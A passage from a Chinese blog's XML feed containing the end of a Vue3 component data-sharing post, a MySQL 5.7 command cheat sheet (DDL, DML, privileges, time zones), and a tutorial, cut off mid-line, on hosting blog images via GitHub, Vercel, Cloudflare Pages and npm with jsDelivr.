vuex</h2><p>vuex是<code>终极的</code>组件之间的数据共享方案。在企业级的vue项目开发中，vuex可以让组件之间的数据共享变得<code>高效</code>、<code>清晰</code>、且<code>易于维护</code>。</p><p><img src="https://img.777nx.cn/test/image-20230509221832242.png" alt="image-20230509221832242"></p><h2 id="6-总结">6. 总结</h2><ul><li><p>父子关系</p><ol><li>父 -&gt; 子 <code>属性绑定</code></li><li>子 -&gt; 父 <code>事件绑定</code></li><li>父 &lt;-&gt; 子 <code>组件上的v-model</code></li></ol></li><li><p>兄弟关系<br>4. <code>EventBus</code></p></li><li><p>后代关系<br>5. <code>provide</code>&amp;<code>inject</code></p></li><li><p>全局数据共享<br>6. <code>vuex</code></p></li></ul>]]></content>
    
    
    <summary type="html">Vue3组件之间的数据共享</summary>
    
    
    
    <category term="前端" scheme="https://www.777nx.cn/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="Vue" scheme="https://www.777nx.cn/tags/Vue/"/>
    
  </entry>
  
  <entry>
    <title>MySQL命令</title>
    <link href="https://www.777nx.cn/posts/1069a098.html"/>
    <id>https://www.777nx.cn/posts/1069a098.html</id>
    <published>2023-05-08T23:46:03.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>开发者必备Mysql常用命令，涵盖了数据定义语句、数据操纵语句及数据控制语句，基于Mysql5.7。</p><h2 id="数据定义语句-DDL">数据定义语句(DDL)</h2><h3 id="数据库操作">数据库操作</h3><ul><li>登录数据库：</li></ul><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -proot</span><br></pre></td></tr></table></figure><ul><li>创建数据库：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database test</span><br></pre></td></tr></table></figure><ul><li>查看所有数据库：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_41.f37d4d3a.png" alt="img"></p><ul><li>选择数据库并使用：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use test</span><br></pre></td></tr></table></figure><ul><li>查看所有数据表：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> tables</span><br></pre></td></tr></table></figure><ul><li>删除数据库：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> database test</span><br></pre></td></tr></table></figure><h3 id="表操作">表操作</h3><ul><li>创建表：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> emp(ename <span class="type">varchar</span>(<span class="number">10</span>),hiredate <span class="type">date</span>,sal <span class="type">decimal</span>(<span class="number">10</span>,<span class="number">2</span>),deptno <span class="type">int</span>(<span class="number">2</span>))  </span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> dept(deptno <span class="type">int</span>(<span class="number">2</span>),deptname <span class="type">varchar</span>(<span class="number">10</span>))</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_42.940b3b71.png" alt="img"></p><ul><li>查看表的定义：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">desc</span> emp</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_43.1ede5291.png" alt="img"></p><ul><li>查看表定义（详细）：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">create</span> <span class="keyword">table</span> emp \G</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_44.79ca2830.png" alt="img"></p><ul><li>删除表：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">table</span> emp</span><br></pre></td></tr></table></figure><ul><li>修改表字段：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp modify ename <span class="type">varchar</span>(<span class="number">20</span>)</span><br></pre></td></tr></table></figure><ul><li>添加表字段：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">add</span> <span class="keyword">column</span> age <span class="type">int</span>(<span class="number">3</span>)</span><br></pre></td></tr></table></figure><ul><li>删除表字段：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp <span class="keyword">drop</span> <span class="keyword">column</span> age</span><br></pre></td></tr></table></figure><ul><li>字段改名；</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp change age age1 <span class="type">int</span>(<span class="number">4</span>)</span><br></pre></td></tr></table></figure><ul><li>修改表名：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> emp rename emp1</span><br></pre></td></tr></table></figure><h2 id="数据操纵语句-DML">数据操纵语句(DML)</h2><h3 id="插入记录">插入记录</h3><ul><li>指定名称插入：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp (ename,hiredate,sal,deptno) <span class="keyword">values</span> (<span class="string">&#x27;zhangsan&#x27;</span>,<span class="string">&#x27;2018-01-01&#x27;</span>,<span class="string">&#x27;2000&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>不指定名称插入：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> emp <span class="keyword">values</span> (<span class="string">&#x27;lisi&#x27;</span>,<span class="string">&#x27;2018-01-01&#x27;</span>,<span class="string">&#x27;2000&#x27;</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><ul><li>批量插入数据：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> dept <span class="keyword">values</span>(<span class="number">1</span>,<span class="string">&#x27;dept1&#x27;</span>),(<span class="number">2</span>,<span class="string">&#x27;dept2&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="修改记录">修改记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> emp <span class="keyword">set</span> sal<span class="operator">=</span><span class="string">&#x27;4000&#x27;</span>,deptno<span class="operator">=</span><span class="number">2</span> <span class="keyword">where</span> ename<span class="operator">=</span><span class="string">&#x27;zhangsan&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="删除记录">删除记录</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> emp <span class="keyword">where</span> ename<span class="operator">=</span><span class="string">&#x27;zhangsan&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="查询记录">查询记录</h3><ul><li>查询所有记录：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp</span><br></pre></td></tr></table></figure><ul><li>查询不重复的记录：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> deptno <span class="keyword">from</span> emp</span><br></pre></td></tr></table></figure><ul><li>条件查询：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> deptno<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> sal<span class="operator">&lt;</span><span class="number">3000</span></span><br></pre></td></tr></table></figure><ul><li>排序和限制：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> deptno <span class="keyword">desc</span> limit <span class="number">2</span></span><br></pre></td></tr></table></figure><ul><li>分页查询(查询从第0条记录开始10条)：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> deptno <span class="keyword">desc</span> limit <span class="number">0</span>,<span class="number">10</span></span><br></pre></td></tr></table></figure><ul><li>聚合(查询部门人数大于1的部门编号)：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> deptno,<span class="built_in">count</span>(<span class="number">1</span>) <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> deptno <span class="keyword">having</span> <span class="built_in">count</span>(<span class="number">1</span>) <span class="operator">&gt;</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>连接查询：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp e <span class="keyword">left</span> <span class="keyword">join</span> dept d <span class="keyword">on</span> e.deptno<span class="operator">=</span>d.deptno</span><br></pre></td></tr></table></figure><ul><li>子查询：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> deptno <span class="keyword">in</span> (<span class="keyword">select</span> deptno <span class="keyword">from</span> dept)</span><br></pre></td></tr></table></figure><ul><li>记录联合：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> deptno <span class="keyword">from</span> emp <span class="keyword">union</span> <span class="keyword">select</span> deptno <span class="keyword">from</span> dept</span><br></pre></td></tr></table></figure><h2 id="数据控制语句-DCL">数据控制语句(DCL)</h2><h3 id="权限相关">权限相关</h3><ul><li>授予操作权限(将test数据库中所有表的select和insert权限授予test用户)：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>,<span class="keyword">insert</span> <span class="keyword">on</span> test.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>查看账号权限：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_45.072633db.png" alt="img"></p><ul><li>收回操作权限：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">revoke</span> <span class="keyword">insert</span> <span class="keyword">on</span> test.<span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_46.9c6f36a5.png" alt="img"></p><ul><li>授予所有数据库的所有权限：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>授予所有数据库的所有权限(包括grant)：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="keyword">with</span> <span class="keyword">grant</span> option</span><br></pre></td></tr></table></figure><ul><li>授予SUPER PROCESS FILE权限（系统权限不能指定数据库）：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> super,process,file <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>只授予登录权限：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> usage <span class="keyword">on</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="账号相关">账号相关</h3><ul><li>删除账号：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure><ul><li>修改自己的密码：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> password <span class="operator">=</span> password(<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure><ul><li>管理员修改他人密码：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> password <span class="keyword">for</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> <span class="operator">=</span> password(<span class="string">&#x27;123&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="其他">其他</h2><h3 id="字符集相关">字符集相关</h3><ul><li>查看字符集：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;character%&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_47.495dee0a.png" alt="img"></p><ul><li>创建数据库时指定字符集：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> database test2 <span class="type">character</span> <span class="keyword">set</span> utf8</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_48.a08408d7.png" alt="img"></p><h3 id="时区相关">时区相关</h3><ul><li>查看当前时区（UTC为世界统一时间，中国为UTC+8）：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> &quot;%time_zone%&quot;</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_49.3441424e.png" alt="img"></p><ul><li>修改mysql全局时区为北京时间，即我们所在的东8区：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> time_zone <span class="operator">=</span> <span class="string">&#x27;+8:00&#x27;</span>;</span><br></pre></td></tr></table></figure><ul><li>修改当前会话时区：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> time_zone <span class="operator">=</span> <span class="string">&#x27;+8:00&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/refer_screen_50.f4888b63.png" alt="img"></p><ul><li>立即生效：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privileges</span><br></pre></td></tr></table></figure><h2 id="最后">最后</h2>]]></content>
    
    
    <summary type="html">开发者必备MySQL命令</summary>
    
    
    
    <category term="Java" scheme="https://www.777nx.cn/categories/Java/"/>
    
    
    <category term="MySQL" scheme="https://www.777nx.cn/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>我的图床解决方案</title>
    <link href="https://www.777nx.cn/posts/ab6c83fc.html"/>
    <id>https://www.777nx.cn/posts/ab6c83fc.html</id>
    <published>2023-05-05T00:42:24.000Z</published>
    <updated>2023-12-27T02:51:31.418Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言">一、前言</h2><p>博客的文章经常需要插入图片，如果我将文档与图片放在一起，那么图片的加载速度将会很慢，于是我使用了图床。</p><p>图床的选择有很多，<a href="https://www.777nx.cn/posts/d7fb1ba1.html">笔者之前写过一篇关于免费图床的汇总</a>，本文就来介绍下我采用的方案：Github图床，NPM。</p><h2 id="二、基于GitHub仓库的图床">二、基于GitHub仓库的图床</h2><h3 id="2-1-建立Github仓库">2.1 建立Github仓库</h3><ol><li>进入<a href="https://github.com/">Github官网</a>注册并登录自己的账号，到自己的个人主页，点击右上角的<code>+</code>，并选择<code>New Repository</code>创建自己的仓库。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505005100794.png" alt="image-20230505005100794"></p><ol start="2"><li>仓库名字随意，描述也可以自由发挥，可见性最好选<code>public</code>，<code>Readme</code>文件可以创建，然后点击<code>Create Repository</code>创建仓库。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505005223253.png" alt="image-20230505005223253"></p><ol start="3"><li>让你的计算机与Github建立通信，这部分可以参考<a href="https://www.777nx.cn/posts/e593433d.html">Hexo 博客搭建基础教程 (一)</a>的第7点，主要是<code>创建公钥</code>、<code>上传公钥</code>、<code>检查通信</code>这几步，确保计算机有权限访问远程仓库，所述教程是用的<code>RSA公钥</code>。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505005657526.png" alt="image-20230505005657526"></p><ol start="4"><li>先在本地创建一个文件夹，文件夹位置和名字随意就可以，进入该文件夹后右键打开<code>Git Bash</code>，然后输入以下代码把之前创建的仓库拷贝下来，其中<code>git clone</code>后面的东西要替换成自己的仓库信息，可以通过自己仓库的ssh链接来获取。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:777nx/fantasy-static.git</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/image-20230505005954445.png" alt="image-20230505005954445"></p><p><img src="https://img.777nx.cn/test/image-20230505010026723.png" alt="image-20230505010026723"></p><p>看到上图的信息就代表成功把整个仓库拷贝到当前文件夹了，此时我们可以看见自己的文件夹多了个<code>.git</code>文件夹和<code>Readme.md</code>文件，这就代表成功了。</p><p><img src="https://img.777nx.cn/test/image-20230505010119305.png" alt="image-20230505010119305"></p><blockquote><p>注意：<code>.git</code>是隐藏文件夹</p></blockquote><ol start="5"><li>此时我们最好在这个文件夹里面创建创建一个<code>img</code>文件夹专门存放图片，如果有存放其他类型资源的可以创建别的文件夹，比如现在想往仓库里加两张图，直接就把图片复制到<code>img</code>文件夹里面即可。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505010504436.png" alt="image-20230505010504436"></p><p>然后在带有<code>Readme.md</code>文件的那个文件夹内，右键打开<code>Git Bash</code>（注意看清楚是什么文件夹），然后依次输入以下命令把更改推送到远程仓库，最后一步不成功可能要多试几次。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;更新图片&quot;</span></span><br><span class="line"><span class="comment"># 推送至github仓库</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>最后看见如下信息就代表推送成功了</p><p><img src="https://img.777nx.cn/test/image-20230505010652292.png" alt="image-20230505010652292"></p><p>仓库此时应该也有了刚刚上传的资源了</p><p><img src="https://img.777nx.cn/test/image-20230505010811285.png" alt="image-20230505010811285"></p><p>下次增删图片或者其他东西，就这样照猫画虎就可以推上来更新仓库！</p><h3 id="2-2-Staticaly-CDN加速">2.2 Staticaly CDN加速</h3><p>直接访问Github仓库的资源是非常慢的！因此我们要用一些免费的CDN进行加速，<code>Staticaly CDN</code>是目前免费CDN中比较好用的啦，他的应用规则如下：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 格式 其中 user是用户名  repo是仓库名  version代表版本(tag或者分支 默认为main)  flie是文件路径 </span></span><br><span class="line">https:<span class="regexp">//</span>cdn.staticaly.com<span class="regexp">/gh/u</span>ser<span class="regexp">/repo@version/</span>file</span><br><span class="line"></span><br><span class="line"><span class="comment"># 比如我的示例仓库就是加速地址就是这个大家可以参考参考</span></span><br><span class="line">https:<span class="regexp">//</span>cdn.staticaly.com<span class="regexp">/gh/</span><span class="number">777</span>nx<span class="regexp">/fantasy-static@main/img</span><span class="regexp">/wallhaven-72x31v.png</span></span><br></pre></td></tr></table></figure><h3 id="2-3-Vercel部署">2.3 Vercel部署</h3><div class="note info modern"><p>此方法加载速度较快，但是需要域名自定义绑定，其优点也是可以绑定自定义域了，目前Vercel每个月限制流量100GB</p></div><ol><li>进入<a href="https://vercel.com/dashboard">Vercel控制面板</a>新建项目，并<code>通过Github继续</code>，选择导入刚刚创建的仓库，然后直接部署即可</li></ol><p><img src="https://img.777nx.cn/test/image-20230505011341235.png" alt="image-20230505011341235"></p><p><img src="https://img.777nx.cn/test/image-20230505011429195.png" alt="image-20230505011429195"></p><ol start="2"><li>进入该项目控制台后，选择右上角的<code>View Domains</code>添加新的域名，添加一个自己域名的二级域名，然后在你对应的域名解析控制台添加对应解析，等待生效。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505011617606.png" alt="image-20230505011617606"></p><p><img src="https://img.777nx.cn/test/image-20230505012224095.png" alt="image-20230505012224095"></p><p><img src="https://img.777nx.cn/test/image-20230505011846533.png" alt="image-20230505011846533"></p><ol start="3"><li><p>通过<code>自定义域名+资源路径</code>即可访问到对应的资源，例如我这里为<code>https://fantasy-static.777nx.cn/img/wallhaven-72x31v.png</code></p></li><li><p>要更新图片怎么办？只要将资源复制到对应的文件夹，然后再执行一次下面的命令即可：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;更新图片&quot;</span></span><br><span class="line"><span class="comment"># 推送至github仓库</span></span><br><span class="line">git push</span><br></pre></td></tr></table></figure><p>这个命令默认是更新到仓库的<code>main</code>分支上，Vercel一旦检测到main分支发送变化就会触发新一轮部署，我们稍候片刻即可通过新的路径访问到新的资源。</p><h3 id="2-4-Cloudflare部署">2.4 Cloudflare部署</h3><div class="note info modern"><p>此方法速度比Vercel稍慢，但是可以不需要域名，目前我就在用这个，而且CloudFlare对于普通用户来说几乎不限量了</p></div><ol><li>进入<a href="https://www.cloudflare.com/">Cloudflare官网</a>注册并登录自己的账号，然后进入控制台后选择左边的<code>Pages</code>，再创建一个新项目并通过Git进行连接，所有参数默认直接部署。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505012614707.png" alt="image-20230505012614707"></p><p><img src="https://img.777nx.cn/test/image-20230505012721012.png" alt="image-20230505012721012"></p><ol start="2"><li>通过给出的<code>初始域名+资源路径</code>即可访问到的对应资源，例如我这个就是<code>fantasy-static.pages.dev/img/wallhaven-72x31v.png</code>，当然你也可以绑定自定义域名使用。</li></ol><p><img src="https://img.777nx.cn/test/image-20230505012852757.png" alt="image-20230505012852757"></p><h2 id="三、npm图床">三、npm图床</h2><h3 id="3-1-npm发布包">3.1 npm发布包</h3><ol><li>首先需要注册一个npm的账号。访问<a href="https://www.npmjs.com/signup/">npm注册页面</a></li></ol><p><img src="https://img.777nx.cn/test/image-20230505013352088.png" alt="image-20230505013352088"></p><ol start="2"><li>完成邮箱验证，注册完成后进入账号管理界面:头像-&gt;Account，拉倒最上方，你会看到<code>You have not verified your email address</code>字样的提示，点击以后按提示步骤验证你的邮箱。</li></ol><p><img src="https://img.777nx.cn/test/02.png" alt="img"></p><ol start="3"><li>找到我们之前创建的图床仓库，在本地合适的位置把它<code>clone</code>下来。找个空文件夹打开终端输入</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[username]/[AssetsRepo].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[username]/[AssetsRepo].git</span><br></pre></td></tr></table></figure><p>例如我的是：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:777nx/fantasy-static.git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/777nx/fantasy-static.git</span><br></pre></td></tr></table></figure><ol start="4"><li>在clone下来的[AssetsRepo]文件夹内(例如我的是fantasy-static文件夹内)打开终端，输入以下指令切换回原生源</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure><ol start="5"><li>添加本地npm用户设置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅第一次使用需要添加用户，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm adduser</span><br><span class="line"><span class="comment"># 非第一次使用直接登录即可，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm login</span><br></pre></td></tr></table></figure><ol start="6"><li>运行npm初始化指令，把整个图床仓库打包，按照指示进行配置，注意需要事先确认你的包名没有和别人已发布的包重复，可以在npm官网搜索相应包名，搜不到就说明还没被占用。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><p><img src="https://img.777nx.cn/test/image-20230505014742021.png" alt="image-20230505014742021"></p><p>最后会输出一段package.json，请求确认，输入yes即可。</p><ol start="7"><li>然后输入发布指令，我们就可以把包发布到npm上了。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><ol start="8"><li>jsdelivr+npm 的图片引用和 jsdelivr+github 很相似，例如我在<code>[AssetsRepo]</code>仓库里存放的<code>/img/wallhaven-72x31v.png</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jsDelivr+github链接</span></span><br><span class="line">https://cdn.jsdelivr.net/gh/[GithubUserName]/[AssetsRepo]/img/wallhaven-72x31v.png</span><br><span class="line"><span class="comment"># jsDelivr+npm链接</span></span><br><span 